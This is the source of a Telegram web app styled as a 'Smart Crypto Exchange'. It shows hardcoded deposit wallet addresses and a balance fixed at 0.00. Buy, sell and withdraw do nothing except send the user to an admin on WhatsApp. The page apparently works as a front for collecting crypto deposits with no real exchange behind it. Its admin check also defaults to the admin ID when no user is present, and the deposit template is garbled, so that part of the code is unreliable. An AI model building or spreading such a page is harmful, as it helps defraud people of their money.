<!DOCTYPE html>
<html lang="rw">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Smart Crypto Exchange</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    body { margin:0; font-family: Arial, sans-serif; background: #0f172a; color: #fff; }
    .header { background: linear-gradient(90deg, #1e40af, #3b82f6); padding: 20px; text-align: center; font-size: 22px; font-weight: bold; }
    .card { background: rgba(255,255,255,0.08); margin: 15px; padding: 20px; border-radius: 16px; }
    button { width: 100%; padding: 16px; margin: 10px 0; border: none; border-radius: 12px; font-size: 17px; font-weight: 600; }
    .primary { background: #22c55e; color: black; }
    .wallet { font-family: monospace; font-size: 15px; word-break: break-all; }
  </style>
</head>
<body>
  <div class="header">🚀 Smart Crypto Exchange</div>
  <div class="container" id="main"></div>

  <script>
    const tg = window.Telegram.WebApp;
    tg.expand();
    tg.BackButton.show();

    const ADMIN_ID = 8616193014;
    const userId = tg.initDataUnsafe?.user?.id || 8616193014;
    const isAdmin = userId === ADMIN_ID;

    const WALLETS = {
      "BEP20 (BNB)": "0xbb12ebf7632b4014f1cd9014b70d9f08c516e263",
      "TRC20 (Tron)": "TMhpeHCWaYFmA6R9D5GkUaUprHyumL8h9W",
      "ERC20 (Ethereum)": "0xbb12ebf7632b4014f1cd9014b70d9f08c516e263"
    };

    async function showMainMenu() {
      document.getElementById('main').innerHTML = `
        <div class="card" onclick="goTo('buy')">💰 Buy Crypto</div>
        <div class="card" onclick="goTo('sell')">💸 Sell Crypto</div>
        <div class="card" onclick="goTo('deposit')">📥 Deposit USDT</div>
        <div class="card" onclick="goTo('withdraw')">📤 Withdraw</div>
        <div class="card" onclick="goTo('balance')">💼 My Balance</div>
        ${isAdmin ? `<div class="card" style="background:#eab308;color:black" onclick="showAdmin()">👑 ADMIN PANEL</div>` : ''}
      `;
    }

    function goTo(page) {
      if (page === 'deposit') {
        let html = `<div class="card"><h2>📥 Deposit USDT</h2>`;
        for (let [net, addr] of Object.entries(WALLETS)) {
          html += `<p><strong>\( {net}</strong><br><span class="wallet"> \){addr}</span></p><hr>`;
        }
        html += `<p style="margin-top:15px;">After sending, send screenshot + amount + network to admin.</p>`;
        html += `<button class="primary" onclick="contactAdmin()">📸 Send Screenshot to Admin</button></div>`;
        document.getElementById('main').innerHTML = html;
      } 
      else if (page === 'withdraw') {
        document.getElementById('main').innerHTML = `
          <div class="card">
            <h2>📤 Withdrawal</h2>
            <p>Choose network and send details to admin:</p>
            <ul>
              <li>BEP20 / TRC20 / ERC20</li>
              <li>Amount</li>
              <li>Your wallet address</li>
            </ul>
            <button class="primary" onclick="contactAdmin()">💬 Contact Admin for Withdrawal</button>
          </div>`;
      } 
      else if (page === 'buy' || page === 'sell') {
        tg.showAlert(`💱 ${page.toUpperCase()} feature is active.\n\nContact admin for instant rate & trade.`);
      } 
      else if (page === 'balance') {
        document.getElementById('main').innerHTML = `<div class="card" style="text-align:center;"><h2>💼 Your Balance</h2><h1>0.00 USDT</h1><p>Deposit to start trading.</p></div>`;
      }
    }

    function contactAdmin() {
      window.open('https://wa.me/250793031666?text=Smart%20Crypto%20Exchange%20Request', '_blank');
    }

    function showAdmin() {
      document.getElementById('main').innerHTML = `
        <div class="card">
          <h3>👑 Admin Panel</h3>
          <p>Approve deposits, process withdrawals, manage rates.</p>
          <button class="primary" onclick="contactAdmin()">Manage Users & Transactions</button>
        </div>
        <button onclick="showMainMenu()">← Back</button>
      `;
    }

    // Initialize
    showMainMenu();
    tg.BackButton.onClick(() => tg.close());
  </script>
</body>
</html>
